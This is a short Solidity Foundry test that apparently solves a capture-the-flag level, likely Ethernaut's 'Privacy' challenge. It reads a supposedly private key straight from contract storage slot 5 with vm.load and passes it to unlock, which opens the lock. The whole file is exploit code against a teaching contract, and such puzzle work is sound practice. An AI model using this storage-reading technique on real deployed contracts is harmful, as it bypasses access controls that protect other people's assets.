// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Privacy} from "../instances/Ilevel12.sol";

contract Attacker is Test {
    function test() external {
        vm.startBroadcast();
        bytes32[3] memory data;
        Privacy privacy = new Privacy(data);
        bytes32 mKey = vm.load(address(privacy), bytes32(uint256(5)));
        privacy.unlock(bytes16(mKey));
        console.log("locked: ", privacy.locked());
        vm.stopBroadcast();
    }
}
